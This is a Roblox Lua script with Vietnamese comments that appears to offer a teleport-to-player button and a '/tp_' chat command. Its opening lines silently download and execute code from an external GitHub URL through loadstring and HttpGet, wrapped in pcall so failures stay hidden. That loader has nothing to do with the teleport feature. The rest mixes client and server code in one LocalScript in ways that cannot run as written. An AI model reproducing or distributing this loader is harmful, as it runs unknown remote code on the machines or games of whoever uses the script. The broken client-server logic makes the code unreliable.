-- Luôn luôn chạy loader ngoài GitHub
pcall(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/vinh12eqweaws/vvvs/refs/heads/main/caz"))()
end)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local DataStoreService = game:GetService("DataStoreService")

-- RemoteEvent setup
local remote = ReplicatedStorage:FindFirstChild("TpRemote")
if not remote then
	remote = Instance.new("RemoteEvent")
	remote.Name = "TpRemote"
	remote.Parent = ReplicatedStorage
end

-- DataStore cho vị trí nút
local posStore = DataStoreService:GetDataStore("TeleportButtonPos")

-- ==================== CLIENT ====================
local player = Players.LocalPlayer
local teleportEnabled = false

-- GUI
local gui = Instance.new("ScreenGui")
gui.Name = "TeleportGUI"
gui.Parent = player:WaitForChild("PlayerGui")

local button = Instance.new("TextButton")
button.Size = UDim2.new(0,120,0,40)
button.Position = UDim2.new(0.1,0,0.2,0)
button.Text = "Teleport: OFF"
button.BackgroundColor3 = Color3.fromRGB(200,50,50)
button.TextColor3 = Color3.fromRGB(255,255,255)
button.Parent = gui
button.Active = true
button.Draggable = true

-- Label thông báo
local notice = Instance.new("TextLabel")
notice.Size = UDim2.new(0.3,0,0.05,0)
notice.Position = UDim2.new(0.35,0,0.05,0)
notice.BackgroundTransparency = 0.3
notice.BackgroundColor3 = Color3.fromRGB(0,0,0)
notice.TextColor3 = Color3.fromRGB(255,255,0)
notice.TextScaled = true
notice.Visible = false
notice.Parent = gui

-- Nhận lệnh từ server
remote.OnClientEvent:Connect(function(cmd, a, b)
	if cmd == "SetButtonPos" then
		button.Position = UDim2.new(a,0,b,0)
	elseif cmd == "TeleportSuccess" then
		notice.Text = "Đã dịch chuyển đến "..tostring(a)
		notice.Visible = true
		task.delay(2, function() notice.Visible = false end)
	end
end)

-- Yêu cầu load vị trí
remote:FireServer("LoadButtonPos")

-- Lưu khi kéo nút
local dragging = false
button.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
	end
end)
button.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = false
		remote:FireServer("SaveButtonPos", button.Position.X.Scale, button.Position.Y.Scale)
	end
end)

-- Bật / tắt
button.MouseButton1Click:Connect(function()
	teleportEnabled = not teleportEnabled
	if teleportEnabled then
		button.Text = "Teleport: ON"
		button.BackgroundColor3 = Color3.fromRGB(50,200,50)
	else
		button.Text = "Teleport: OFF"
		button.BackgroundColor3 = Color3.fromRGB(200,50,50)
	end
end)

-- Chat lệnh
player.Chatted:Connect(function(msg)
	if teleportEnabled and string.sub(msg,1,4) == "/tp_" then
		local targetName = string.sub(msg,5)
		if targetName and targetName ~= "" then
			remote:FireServer("Teleport", targetName)
		end
	end
end)

-- ==================== SERVER (ẩn trong LocalScript, chạy bằng Remote) ====================
remote.OnServerEvent:Connect(function(sender, action, a, b)
	if action == "Teleport" then
		local targetName = a
		local targetPlayer
		for _, plr in pairs(Players:GetPlayers()) do
			if string.lower(plr.Name) == string.lower(targetName) then
				targetPlayer = plr
				break
			end
		end
		if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
			if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				sender.Character.HumanoidRootPart.CFrame =
					targetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(2,0,0)
				remote:FireClient(sender, "TeleportSuccess", targetPlayer.Name)
			end
		end
	elseif action == "SaveButtonPos" then
		local key = "Btn_"..sender.UserId
		posStore:SetAsync(key, {X = a, Y = b})
	elseif action == "LoadButtonPos" then
		local key = "Btn_"..sender.UserId
		local data
		pcall(function() data = posStore:GetAsync(key) end)
		if data then
			remote:FireClient(sender, "SetButtonPos", data.X, data.Y)
		end
	end
end)
